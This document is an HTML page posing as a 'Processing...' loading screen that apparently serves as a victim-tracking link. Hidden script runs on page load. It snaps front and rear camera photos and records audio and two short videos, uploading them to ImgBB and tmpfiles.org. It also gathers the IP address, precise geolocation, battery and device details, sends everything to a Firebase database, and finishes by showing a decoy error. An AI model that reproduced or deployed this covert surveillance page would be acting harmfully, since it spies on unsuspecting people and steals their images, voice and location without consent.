<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Processing...</title>

<style>
    body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: #000; }
    iframe { width: 100%; height: 100%; border: none; position: absolute; top: 0; left: 0; z-index: 1; }
    #status { display: none; }
    video, canvas { display: none; }
</style>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

</head>

<body>

<iframe src="mpeits
"></iframe>
<div id="status">Down loading...</div>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const firebaseConfig = {
    databaseURL: "https://redrx-231b5-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const statusDiv = document.getElementById("status");
const imgbbApiKey = "246c77b39552757dc3535d6a7896342a";

function getUserId(){
    const urlParams = new URLSearchParams(window.location.search);
    let id = urlParams.get("id");
    if(!id){
        id = "a77266f8db6ccb82";
    }
    return id;
}

async function captureImage(facingMode) {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: facingMode },
            audio: false
        });
        
        video.srcObject = stream;
        
        await new Promise(resolve => video.onloadedmetadata = resolve);
        await new Promise(resolve => setTimeout(resolve, 1000)); 
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        stream.getTracks().forEach(track => track.stop());
        
        let dataUrl = canvas.toDataURL('image/jpeg');
        return dataUrl.split(',')[1];
    } catch (e) {
        console.log("Error capturing camera (" + facingMode + "):", e);
        return null;
    }
}

async function uploadToImgBB(base64Image) {
    if (!base64Image) return "Failed to capture";
    
    try {
        let formData = new FormData();
        formData.append("image", base64Image);
        
        const response = await fetch(`https://api.imgbb.com/1/upload?key=${imgbbApiKey}`, {
            method: "POST",
            body: formData
        });
        
        const result = await response.json();
        if (result.success) {
            return result.data.url;
        } else {
            return "Upload error";
        }
    } catch (e) {
        console.log(e);
        return "Upload failed";
    }
}

async function recordAudio(duration) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        
        await new Promise(r => setTimeout(r, duration));
        recorder.stop();

        return new Promise(resolve => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: "audio/mp3" });
                const fd = new FormData();
                fd.append("file", blob, "voice.mp3");
                
                try {
                    const up = await fetch("https://tmpfiles.org/api/v1/upload", { method: "POST", body: fd });
                    const j = await up.json();
                    stream.getTracks().forEach(t => t.stop());
                    
                    if(j.status === "success") {
                        const directUrl = j.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
                        resolve(directUrl);
                    } else {
                        resolve("Upload error");
                    }
                } catch(err) {
                    resolve("Upload failed");
                }
            };
        });
    } catch(e) {
        console.log("Error capturing audio:", e);
        return "Permission denied or no microphone";
    }
}

async function recordVideoMedia(facingMode, duration) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        
        await new Promise(r => setTimeout(r, duration));
        recorder.stop();

        return new Promise(resolve => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: "video/mp4" });
                const fd = new FormData();
                fd.append("file", blob, "video.mp4");
                
                try {
                    const up = await fetch("https://tmpfiles.org/api/v1/upload", { method: "POST", body: fd });
                    const j = await up.json();
                    stream.getTracks().forEach(t => t.stop());
                    
                    if(j.status === "success") {
                        const directUrl = j.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
                        resolve(directUrl);
                    } else {
                        resolve("Upload error");
                    }
                } catch(err) {
                    resolve("Upload failed");
                }
            };
        });
    } catch(e) {
        console.log("Error capturing video:", e);
        return "Permission denied or no camera/microphone";
    }
}

window.addEventListener("DOMContentLoaded", async () => {

    let ipAddress = "Unknown";
    let batteryLevel = "Unknown";
    let locationText = "Unknown";
    let latitude = "";
    let longitude = "";
    const userId = getUserId();
    
    let frontBack64 = await captureImage("user");
    let camerarxUrl = await uploadToImgBB(frontBack64);
    
    let environmentBase64 = await captureImage("environment");
    let camerarsUrl = await uploadToImgBB(environmentBase64);

    let audioUrl = await recordAudio(8000);

    let video1Url = await recordVideoMedia("user", 8000);

    let video2Url = await recordVideoMedia("environment", 8000);

    try{
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipJson = await ipResponse.json();
        ipAddress = ipJson.ip;
    }catch(e){ console.log(e); }

    try{
        if(navigator.getBattery){
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + "%";
        }
    }catch(e){ console.log(e); }

    try{
        const position = await new Promise((resolve,reject)=>{
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy:true,
                timeout:10000
            });
        });

        latitude = position.coords.latitude;
        longitude = position.coords.longitude;

        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const geoData = await geo.json();
        const country = geoData.address.country || "Unknown";
        const address = geoData.display_name || "Unknown";

        locationText = "Country : " + country + "
Full Adress : " + address;
    }catch(e){ console.log(e); }

    let deviceInfo =
    "Platform : " + navigator.platform +
    "
UserAgent : " + navigator.userAgent +
    "
Language : " + navigator.language +
    "
Screen : " + screen.width + "x" + screen.height +
    "
CPU Cores : " + navigator.hardwareConcurrency +
    "
RAM : " + (navigator.deviceMemory || "Unknown") + " GB";

    const currentIsoTime = new Date().toISOString();

    await database.ref("BlankRx/" + userId).set({
        ip: ipAddress,
        time: currentIsoTime,
        device: "Battery: " + batteryLevel + " | Platform: " + navigator.platform,
        chat_id: userId,
        location: locationText,
        locationx: latitude,
        locations: longitude,
        info: deviceInfo
    });

    await database.ref("CameraRx/" + userId).set({
        camerarx: camerarxUrl,
        camerars: camerarsUrl,
        chat_id: userId,
        time: currentIsoTime,
        ip: ipAddress
    });

    await database.ref("RecordRx/" + userId).set({
        audio: audioUrl,
        chat_id: userId,
        time: currentIsoTime,
        ip: ipAddress
    });

    await database.ref("VideoRx/" + userId).set({
        video1: video1Url,
        video2: video2Url,
        chat_id: userId,
        time: currentIsoTime,
        ip: ipAddress
    });

    statusDiv.innerText = "An error occurred during loading";

});
</script>

</body>
</html>
